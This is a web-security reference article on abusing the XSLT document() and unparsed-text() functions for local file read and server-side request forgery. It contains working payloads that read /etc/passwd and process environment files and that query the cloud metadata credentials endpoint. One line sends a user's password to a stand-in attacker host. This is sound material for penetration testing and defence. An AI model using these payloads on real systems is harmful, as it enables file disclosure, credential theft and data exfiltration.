---
title: "Document function abuse: file read and SSRF during transforms"
description: "The XSLT document() function resolves attacker-controlled URIs at transform time, giving local file read and server-side request forgery against internal endpoints."
keywords:
  - XSLT document function
  - document file read
  - XSLT SSRF
  - cloud metadata
  - unparsed-text
---

# Document function abuse

`document()` is XSLT's URI resolver: it fetches a resource, parses it as XML, and returns the node tree for the stylesheet to process. When an attacker controls the argument, or controls stylesheet text that calls it, the transform fetches a resource of the attacker's choosing while running with the server's filesystem and network access. The resolved content then flows into the output, so both the file-read and the request-forgery results come straight back in the response.

## Local file read

A `file://` URI reads a document from disk. Injected into a value that reaches the argument, or written into an attacker-influenced stylesheet, it exposes local files to the output:

```xml
<xsl:value-of select="document('file:///etc/passwd')"/>
<xsl:copy-of select="document('file:///opt/app/WEB-INF/web.xml')"/>
```

`document()` parses its target as XML, so it reads XML-shaped files cleanly; for arbitrary text, XSLT 2.0 and later provide `unparsed-text()`, which returns the raw bytes and does not require well-formed markup:

```xml
<xsl:value-of select="unparsed-text('file:///etc/passwd')"/>
<xsl:value-of select="unparsed-text('/proc/self/environ')"/>
```

A non-XML file handed to `document()` triggers a parse error, and when the engine echoes that error it leaks file content and absolute paths anyway, a useful fallback where `unparsed-text` is unavailable.

## Server-side request forgery

The same function accepts `http://` and `https://` URIs, turning the transform engine into a request proxy positioned inside the network perimeter:

```xml
<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
<xsl:copy-of select="document('http://internal-admin.svc.local/users')"/>
```

The cloud metadata service is the highest-value target because the credential response is embedded in the rendered output. Internal-only admin panels, service APIs, and health endpoints are reachable the same way. Where the response is not reflected, the request still fires, so a URI pointed at an attacker-controlled host confirms blind SSRF and carries data out through the path or query string:

```xml
<xsl:value-of select="document(concat('http://attacker.example/x?d=', encode-for-uri(//user[1]/password)))"/>
```

## Parameter-driven injection

Even a stylesheet the attacker cannot edit is exploitable when the application passes a request value as a stylesheet parameter that the transform then feeds to `document()`:

```xml
<xsl:param name="src"/>
<xsl:value-of select="document($src)"/>
```

Setting `src` to `file:///etc/hostname` or an internal URL reuses the same primitives without touching the stylesheet body, the common case in report and template features that let users point a transform at a chosen data source.

## References

- [W3C XSLT 2.0: The document() Function](https://www.w3.org/TR/xslt20/#document)
- [PortSwigger: XML and XSLT](https://portswigger.net/kb/issues/00100f10_xslt-injection)
